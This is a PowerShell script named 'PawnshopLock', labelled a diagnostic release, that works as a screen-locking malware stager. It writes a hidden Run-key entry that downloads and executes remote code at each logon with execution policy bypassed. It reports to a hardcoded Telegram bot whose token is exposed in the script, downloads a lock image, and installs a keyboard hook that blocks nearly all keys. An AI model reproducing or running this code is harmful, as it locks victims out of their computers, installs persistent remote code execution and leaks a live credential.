# =========================================================
# PawnshopLock v5.1.1 – safe‑boot (diagnostic) release
# =========================================================
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# ---------- SETTINGS -------------------------------------
$imageURL = 'https://raw.githubusercontent.com/diezul/x/main/1.png'
$botToken = '7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co'
$chatID   = '656189986'
# ----------------------------------------------------------

# quick TG helper
function TG([string]$m){
    try{ @{chat_id=$chatID;text=$m}|ConvertTo-Json -Compress|
         Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" `
         -Method POST -ContentType 'application/json' -TimeoutSec 10 }catch{}
}

TG "🛠 script started on $env:COMPUTERNAME, preparing components..."

# ---------- ensure autorun once ----------------------------------------
try{
    $runKey='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
    $val   ='PawnshopLock'
    $raw   ='https://raw.githubusercontent.com/diezul/x/main/kk.ps1'  # <‑‑ note kk.ps1
    $cmd   ="powershell -w hidden -ep Bypass -Command `"iwr $raw | iex`""
    if((Get-ItemProperty $runKey -Name $val -ErrorAction SilentlyContinue).$val -ne $cmd){
        New-Item -Path $runKey -Force|Out-Null
        Set-ItemProperty -Path $runKey -Name $val -Value $cmd
    }
}catch{ TG \"⚠ autorun error: $_\" }

# ---------- download lock image ----------------------------------------
$tempImg=\"$env:TEMP\\pawnlock.jpg\"; try{ Invoke-WebRequest $imageURL -OutFile $tempImg -UseBasicParsing }catch{}

# ---------- compile keyblocker safely ----------------------------------
$kbCode=@'
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
public class KB{
  static IntPtr h=IntPtr.Zero;
  delegate IntPtr P(int n,IntPtr w,IntPtr l);
  static P d=Hook;
  const int WH=13,WM1=0x100,WM2=0x104;
  [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int id,P cb,IntPtr m,uint t);
  [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr h);
  [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr h,int n,IntPtr w,IntPtr l);
  [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string n);
  public static void Block(){ if(h==IntPtr.Zero) h=SetWindowsHookEx(WH,d,GetModuleHandle(null),0);}
  public static void Unblock(){ if(h!=IntPtr.Zero){UnhookWindowsHookEx(h);h=IntPtr.Zero;}}
  static IntPtr Hook(int n,IntPtr w,IntPtr l){
     if(n>=0&&(w==(IntPtr)WM1||w==(IntPtr)WM2)){
         int vk=Marshal.ReadInt32(l);
         if(vk==0x43) return CallNextHookEx(h,n,w,l);
         return (IntPtr)1;
     }
     return CallNextHookEx(h,n,w,l);
  }
}
'@

try{
    Add-Type $kbCode -ReferencedAssemblies 'System.Windows.Forms'
}catch{
    TG \"❌ C# compile failed: $_\"
    exit
}

# ---------- (the rest of your previous v5.1 script stays unchanged) ----
# ... overlay form, telegram loop etc.
